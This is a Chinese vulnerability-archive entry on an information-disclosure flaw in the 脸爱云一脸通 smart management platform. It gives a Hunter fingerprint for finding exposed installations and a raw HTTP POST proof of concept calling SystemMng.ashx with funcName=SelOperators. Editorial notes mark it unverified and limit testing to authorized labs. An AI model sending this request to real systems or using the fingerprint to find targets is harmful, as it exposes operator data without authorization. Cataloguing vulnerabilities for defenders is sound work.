---
source: "wy876 漏洞文库"
title: "脸爱云一脸通智慧管理平台 SystemMng SelOperators信息泄露"
product: "脸爱云一脸通智慧管理平台"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
affected_scope: "版本未知，username=admin例"
prerequisites: "未说明"
side_effects: "现有材料未完整列明副作用；示例不保证只读或无状态变化"
review_date: "2026-10-02"
source_url: "https://www.yuque.com/xiaokp7/ocvun2/gg2q9qg8ttmq4azt"
source_status: "recorded"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E5%95%86%E4%B8%9A%E8%BD%AF%E4%BB%B6/%E8%84%B8%E7%88%B1%E4%BA%91/%E8%84%B8%E7%88%B1%E4%BA%91%E4%B8%80%E8%84%B8%E9%80%9A%E6%99%BA%E6%85%A7%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0SelOperators%E5%AD%98%E5%9C%A8%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E.md"
hunter: "web.icon==\"4f0be080512ee0b45fc90ff894b6ba60\""
id: "vw-bba532d5587e1130da74ab3b"
entity_id: "ve-bba532d5587e1130da74ab3b"
schema_version: "1"
previous_fofa_unverified: "web.icon=="
---

# 脸爱云一脸通智慧管理平台 SystemMng SelOperators信息泄露

> 指纹字段校订（2026-10-04）：本文原归档明确标为 Hunter 的完整表达式已记入 `hunter`；原残缺 `fofa_unverified` 值逐字保存在 `previous_fofa_unverified`。后文关于该字段残缺的旧说明只描述校订前状态。查询用于产品检索，不证明资产受影响。

## 条目说明

- 对象与具体问题：脸爱云一脸通智慧管理平台；SystemMng SelOperators信息泄露
- 版本、配置及部署条件：版本未知，username=admin例
- 认证与权限前提：未说明
- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。

## 证据边界与更正

以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。

- 同513SystemMng但动作SelOperators与getOperators不同，需返回/代码确定是否同一权限缺失
- 无返回字段，正文username不是登录证明；静态Content-Length需重算
- Hunter错填fofa，HTML和营销需精简，无修复

## 操作风险

现有材料未完整列明副作用；示例不保证只读或无状态变化。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。

## 技术资料与来源记录

## 一、漏洞简介
脸爱云一脸通智慧管理平台是一套功能强大，运行稳定，操作简单方便，用户界面美观，轻松统计数据的一脸通系统。无需安装，只需在后台配置即可在浏览器登录。脸爱云一脸通智慧管理平台SelOperators存在信息泄露漏洞。

## 二、影响版本
+ 脸爱云一脸通智慧管理平台

## 三、资产测绘
+ hunter`web.icon=="4f0be080512ee0b45fc90ff894b6ba60"`
+ 特征


## 四、漏洞复现
```http
POST /SystemMng.ashx HTTP/1.1
Host: 
Content-Length: 36
Accept: application/json, text/javascript, */*; q=0.01
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close

username=admin&funcName=SelOperators
```

> 请求长度说明：原资料 Content-Length 为 36；保留原始标头；其数值未据实际请求体重新计算或验证。


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/gg2q9qg8ttmq4azt>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
